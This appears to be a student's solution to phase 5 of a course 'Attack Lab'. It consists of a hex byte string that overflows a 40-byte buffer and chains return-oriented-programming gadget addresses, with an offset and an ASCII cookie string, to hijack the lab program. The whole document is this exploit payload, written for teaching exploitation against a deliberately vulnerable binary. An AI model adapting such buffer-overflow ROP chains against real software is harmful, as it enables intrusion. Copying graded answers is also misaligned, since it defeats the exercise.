Attack Lab Phase 5

Buffer input:

/* fill the buffer for the first 40 byte */
00 00 00 00 00 00 00 00  /* cookie as string */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
/* end of buffer */
31 19 40 00 00 00 00 00
c2 19 40 00 00 00 00 00
9c 19 40 00 00 00 00 00
c9 19 40 00 00 00 00 00
d5 18 40 00 00 00 00 00
41 00 00 00 00 00 00 00  /* offset from rsp for the string */ 
e7 18 40 00 00 00 00 00
07 19 40 00 00 00 00 00
e7 18 40 00 00 00 00 00
3c 18 40 00 00 00 00 00
35 61 34 66 37 39 36 62 00
